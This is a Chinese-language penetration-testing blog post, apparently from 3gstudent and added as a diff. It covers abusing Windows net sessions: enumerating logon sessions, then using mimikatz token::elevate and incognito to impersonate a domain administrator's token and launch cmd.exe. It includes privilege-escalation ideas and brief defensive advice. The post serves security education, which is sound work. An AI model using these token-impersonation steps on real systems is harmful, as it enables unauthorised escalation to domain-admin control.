@@ -1,0 +1,275 @@
+<article class="post">
+  <h1>渗透技巧——Windows中net session的利用</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>在Windows系统中，使用net use命令能够实现远程连接网络中其他计算机的共享资源，连接建立后会创建一个net session。
+在渗透测试中，如果我们获得了一台Windows主机的权限，在上面发现了net session，就可以利用这个net session，使用net session的token创建进程。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>查看net session的方法</li>
+  <li>net session的利用</li>
+  <li>net session的清除</li>
+  <li>利用思路</li>
+  <li>防御建议</li>
+</ul>
+
+<h2 id="0x02-测试环境">0x02 测试环境</h2>
+<hr>
+
+<p>COMPUTER01：</p>
+
+<ul>
+  <li>Win7 x64</li>
+  <li>域内一台主机</li>
+  <li>192.168.10.2</li>
+  <li>使用帐号test1登录</li>
+</ul>
+
+<p>DC:</p>
+
+<ul>
+  <li>Server2008 R2x64</li>
+  <li>域控服务器</li>
+  <li>192.168.10.1</li>
+</ul>
+
+<p>在DC上使用域管理员帐号Administrator通过net use远程连接COMPUTER01，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/2-1.png" alt="Alt text"></p>
+
+<h2 id="0x03-查看net-session的方法">0x03 查看net session的方法</h2>
+<hr>
+
+<h3 id="1cmd命令">1、cmd命令</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net session
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-1.png" alt="Alt text"></p>
+
+<h3 id="2logonsessions">2、LogonSessions</h3>
+
+<p>下载地址：</p>
+
+<p>https://docs.microsoft.com/en-us/sysinternals/downloads/logonsessions</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-2.png" alt="Alt text"></p>
+
+<p>可以发现，net session的Logon type为Network</p>
+
+<h3 id="3c实现">3、c++实现</h3>
+
+<p>首先通过Windows API LsaEnumerateLogonSessions()枚举当前的Logon Session</p>
+
+<p>接着使用LsaGetLogonSessionData()获得每个Logon Session的具体信息</p>
+
+<p>在程序编写上需要注意无法直接显示sid和时间，需要对格式进行转换</p>
+
+<p>开源代码地址：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/ListLogonSessions.cpp</p>
+
+<p>代码按照LogonSessions的格式输出结果</p>
+
+<h3 id="4mimikatz">4、mimikatz</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
+token::list
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-3.png" alt="Alt text"></p>
+
+<p>TEST\Administrator对应的ID为6919466</p>
+
+<h4 id="补充mimikatz的命令">补充mimikatz的命令</h4>
+
+<p>查看当前token：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::whoami
+</code></pre></div></div>
+
+<p>恢复进程token：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::revert
+</code></pre></div></div>
+
+<p>假冒成system：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::elevate
+</code></pre></div></div>
+
+<p>假冒成domain admin：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::elevate /domainadmin
+</code></pre></div></div>
+
+<p>假冒成enterprise admin：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::elevate /enterpriseadmin
+</code></pre></div></div>
+
+<p>假冒成admin：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::elevate /admin
+</code></pre></div></div>
+
+<p>假冒成id为123456的token：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::elevate /id:123456
+</code></pre></div></div>
+
+<h2 id="0x04-net-session的利用">0x04 net session的利用</h2>
+<hr>
+
+<p>net session的token保存在lsass进程中，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-0.png" alt="Alt text"></p>
+
+<p>在利用上，net session等同于对其token的利用</p>
+
+<h3 id="1mimikatz">1、mimikatz</h3>
+
+<p>假冒成id为6919466的token：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::elevate /id:6919466
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-4.png" alt="Alt text"></p>
+
+<p><strong>注：</strong></p>
+
+<p>上述操作只改变了Thread Token</p>
+
+<p>Windows下有两种token：Primary Token和Impersonation Token</p>
+
+<p>Primary Token对应Process Token，每个进程都有唯一的Primary Token</p>
+
+<p>Impersonation Token对应Thread Token，可以被修改</p>
+
+<p>接下来，使用该token创建进程cmd.exe：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>process::start cmd.exe
+</code></pre></div></div>
+
+<p>但是该命令不会使用新的Thread Token，也就是说进程cmd.exe并没有以TEST\Administrator启动</p>
+
+<h4 id="原因如下">原因如下：</h4>
+
+<p>https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/mimikatz/modules/kuhl_m_process.c#L38</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-5.png" alt="Alt text"></p>
+
+<p>https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/modules/kull_m_process.c#L490</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/3-6.png" alt="Alt text"></p>
+
+<p>mimikatz在执行<code class="language-plaintext highlighter-rouge">process::start</code>命令时，使用<code class="language-plaintext highlighter-rouge">CreateProcess</code>创建进程，并没有传入token</p>
+
+<h4 id="解决方法">解决方法：</h4>
+
+<p>修改mimikatz的源码，使用CreateProcessAsUser()创建进程，能够传入Token</p>
+
+<p>当然，我们还可以使用其他工具来实现这个过程</p>
+
+<h3 id="2使用incognito">2、使用incognito</h3>
+
+<p>源代码开源地址：</p>
+
+<p>https://github.com/fdiskyou/incognito2</p>
+
+<p><strong>注：</strong></p>
+
+<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/">《渗透技巧——Token窃取与利用》</a>曾介绍过incognito的用法</p>
+
+<p>列出当前token：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe list_tokens -u
+</code></pre></div></div>
+
+<p>以”TEST\Administrator”启动cmd.exe：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe execute -c "TEST\Administrator" cmd.exe
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/4-1.png" alt="Alt text"></p>
+
+<p>net session利用成功，以用户”TEST\Administrator”启动进程cmd.exe，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-3/4-2.png" alt="Alt text"></p>
+
+<h2 id="0x05-net-session的清除">0x05 net session的清除</h2>
+<hr>
+
+<h3 id="1cmd命令-1">1、cmd命令</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net session /delete /y
+</code></pre></div></div>
+
+<h3 id="2删除net-use连接">2、删除net use连接</h3>
+
+<p>net use的发起方删除连接：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use * /del /y
+</code></pre></div></div>
+
+<h2 id="0x06-利用思路">0x06 利用思路</h2>
+<hr>
+
+<h3 id="1本地提权">1、本地提权</h3>
+
+<p>如果尚未获得本地管理员权限，但获得了SeImpersonate或者SeAssignPrimaryToken权限，就能利用net session中的token创建新进程，实现提权</p>
+
+<p><strong>注：</strong></p>
+
+<p>之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/">《Windows本地提权工具Juicy Potato测试分析》</a>和<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows-Token%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8/">《渗透技巧——Windows Token九种权限的利用》</a>提到过这个方法</p>
+
+<h3 id="2域内渗透">2、域内渗透</h3>
+
+<p>取决于net session的权限，新创建的进程能够继承net session的token</p>
+
+<h2 id="0x07-防御建议">0x07 防御建议</h2>
+<hr>
+
+<p>1、域环境内限制用户权限，尽量避免使用域管理员帐户远程连接
+2、使用net use远程连接后记得及时清除</p>
+
+<h2 id="0x08-小结">0x08 小结</h2>
+<hr>
+
+<p>本文介绍了利用net session的token创建进程的方法，分析利用思路，给出防御建议。</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on December  3, 2018
+  </div>
+
+  
+</article>
